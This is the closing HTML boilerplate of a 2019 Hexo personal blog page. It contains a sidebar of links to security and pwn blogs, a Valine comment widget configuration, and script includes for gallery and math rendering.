        <div class="widget">
            <ul>
                
                    <li>
                        <a href="https://redogwu.github.io">redogWu</a>
                    </li>
                
                    <li>
                        <a href="http://grootsec.org/">grootsec</a>
                    </li>
                
                    <li>
                        <a href="https://hpasserby.me">Hpasserby的pwn</a>
                    </li>
                
            </ul>
        </div>
    </div>


    
    <div id="toTop" class="fa fa-angle-up"></div>
</aside>

            
        </div>
        <footer id="footer">
    <div class="outer">
        <div id="footer-info" class="inner">
            &copy; 2019 HACHp1<br>
            Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
        </div>
    </div>
</footer>
        
    
    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
    <script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.6/dist/Valine.min.js"></script>
    <script>
        new Valine({
            el: '#valine-thread' ,
            notify:true,
            verify:true,
            app_id: 'GpqOpUBld8udMg3PSOCDbYr7-gzGzoHsz',
            app_key: 'k6nxcdbcy4MrjOq2DssFFljB',
            placeholder: '少侠，留下几句话，我们喝一壶啊 ヾﾉ≧∀≦)o （支持markdown语句，可插入图片）'
        });
    </script>




    
        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
    
    
    
        <script type="text/x-mathjax-config">
            MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
        </script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
    



<!-- Custom Scripts -->
<script src="/js/main.js"></script>

    </div>
</body>
</html>